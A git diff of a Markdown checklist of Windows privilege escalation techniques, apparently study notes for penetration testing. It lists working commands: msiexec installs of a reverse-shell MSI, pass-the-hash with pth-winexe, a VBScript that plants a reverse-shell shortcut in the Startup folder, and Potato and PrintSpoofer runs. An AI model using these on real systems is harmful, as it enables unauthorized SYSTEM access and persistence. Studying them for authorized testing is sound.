@@ -42,8 +42,9 @@ Hi There today I published a checklist of strategies on Linux Privilege Escalati
 ```
 ## Windows Privilege Escalation Techniques:
 
-```
+
 1- Kernel Exploits (last choice):
+```
   - First Enumerate Windows version/patch level (systeminfo).
   - Find exploits on (searchsploit, Google, ExploitDB, GitHub)
   - Compile & run
@@ -52,24 +53,25 @@ Hi There today I published a checklist of strategies on Linux Privilege Escalati
   - Windows Exploit Suggester: https://github.com/bitsadmin/wesngPrecompiled 
   - Pro Tip: First Check Those Kernel Exploits: https://github.com/SecWiki/windows-kernel-exploits
     - Watson: https://github.com/rasta-mouse/Watson
-
+```
 2- Service Exploits:
+```
    - Insecure Service Permissions
       - NOTE: if you can change a service configuration but cannot stop/start the service you may fall on RABBIT HOLE
    - Unquoted Service Path
    - Weak Registry Permissions
    - Insecure Service Executables
    - DLL Hijacking
-  
+```  
 3- Registery Exploit:
-  - AutoRun executables
+```
+- AutoRun executables
       - check for writable AutoRun executables
         > .\winPEASany.exe quiet applicationsinfo
   
       - then use accesschk.exe to verify the permissions on each one:
         > .\accesschk.exe /accepteula -wvu "[file PATH]"
-        
-      
+              
    - AlwaysInstallElevated
       - NOTE: Two Registry settings must be enabled for this to work. The "AlwaysInstallElevated" value must be set to 1. If either of these are missing or disabled, the exploit will not work.
           >local machine:
@@ -82,8 +84,9 @@ Hi There today I published a checklist of strategies on Linux Privilege Escalati
           > .\winPEASany.exe quiet windowscreds
       - Then Create a new reverse shell with msfvenom, using the msi format, and save it with the .msi extension
           > msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
-        
+```        
 4- Passwords
+```
   - searching registery for passwords
     - Auto: 
       > .\winPEASany.exe quiet filesinfo userinfo
@@ -112,17 +115,18 @@ Hi There today I published a checklist of strategies on Linux Privilege Escalati
           > pth-winexe-U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe
       - or spawn a SYSTEM level command prompt:
           > pth-winexe --system -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe
-      
+```      
       
 5- Scheduled Tasks
+```
   - CAUTION: Unfortunately, there is no easy method for enumerating custom tasks that belong to other users as a low privileged user account.
   - List all scheduled tasks your user:
     > schtasks /query /fo LIST /v
   - in PowerShell 
     > Get-ScheduledTask | where {$_.TaskPath-notlike"\Microsoft*"} | ft TaskName,TaskPath,State
- 
+ ```
 6- Startup Apps
-
+```
   - Windows has a startup directory for apps that should start for all users:
    > C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
    
@@ -133,7 +137,7 @@ Hi There today I published a checklist of strategies on Linux Privilege Escalati
       > .\accesschk.exe/accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
    
    - Second: create file & name it "CreateShortcut.vbs" the content of the file is a VBScript code to create a shortcut file of our reverse shell:
-   
+
 Set oWS= WScript.CreateObject("WScript.Shell")
 sLinkFile= "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
 Set oLink= oWS.CreateShortcut(sLinkFile)
@@ -142,21 +146,24 @@ oLink.Save
 
    - Finally: run the script:
       > cscript CreateShortcut.vbs
-    
+ ```   
 7- Installed Apps exploits:
+```
   - enumerate running programs:
     > tasklist /v<br />
     > .\seatbelt.exe NonstandardProcesses<br />
     > .\winPEASany.exe quiet procesinfo<br />
   - when you see an intersting app search for exploits in (exploit-db, google, GitHub, others)
-  
+ ``` 
 8- Hot Potato:
+```
   - Potato.exe
     - https://github.com/foxglovesec/Potato/blob/master/source/Potato/Potato/bin/Release/Potato.exe
     - working on Windows 7
         > .\potato.exe -ip 192.168.1.33 -cmd "C:\PrivEsc\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
-    
+ ``` 
  9- Token Impersonation:
+ ```
    - "SeImpersonatePrivilege/SeAssignPrimaryToken" privilege needed to be enabled.
     
    - Juicy Potato
@@ -185,9 +192,10 @@ oLink.Save
             Blog: https://itm4n.github.io/printspoofer-abusing-impersonate-privileges
         - Usage: 
         > C:\PrivEsc\PrintSpoofer.exe –i -c "C:\PrivEsc\reverse.exe"
-        
+```        
         
  10- User Privileges:
+ ```
   - In Windows, user accounts and groups can be assigned specific “privileges”.These privileges grant access to certain abilities.Some of these abilities can be used to escalate our overall privileges to that of SYSTEM.
   - Highly detailed paper: https://github.com/hatRiot/token-priv
   - To list out Privileges:
@@ -227,11 +235,14 @@ oLink.Save
   
   5- Spend some time and read over the results of your enumeration.
   
-  `If WinPEAS or another tool finds something interesting, make a note of it. Avoid rabbit holes by creating a checklist of things you need for the privilege escalation method to work.`
+`` 
+If WinPEAS or another tool finds something interesting, make a note of it. Avoid rabbit holes by creating a checklist of things you need for the privilege escalation method to work.
   
-  `Have a quick look around for files in your user’s desktop and other common locations (e.g. C:\and C:\Program Files).Read through interesting files that you find, as they may contain useful information that could help escalate privileges.`
+  Have a quick look around for files in your user’s desktop and other common locations (e.g. C:\and C:\Program Files).Read through interesting files that you find, as they may contain useful information that could help escalate privileges.
   
-  `Try things that don’t have many steps first, e.g. registry exploits, services, etc.Have a good look at admin processes, enumerate their versions and search for exploits.Check for internal ports that you might be able to forward to your attacking machine.`
+  Try things that don’t have many steps first, e.g. registry exploits, services, etc.Have a good look at admin processes, enumerate their versions and search for exploits.Check for internal ports that you might be able to forward to your attacking machine.
   
-  `If you still don’t have an admin shell, re-read your full enumeration dumps and highlight anything that seems odd.This might be a process or file name you aren’t familiar with or even a username.At this stage you can also start to think about Kernel Exploits.`
+  If you still don’t have an admin shell, re-read your full enumeration dumps and highlight anything that seems odd.This might be a process or file name you aren’t familiar with or even a username.At this stage you can also start to think about Kernel Exploits.
+  
+``
   
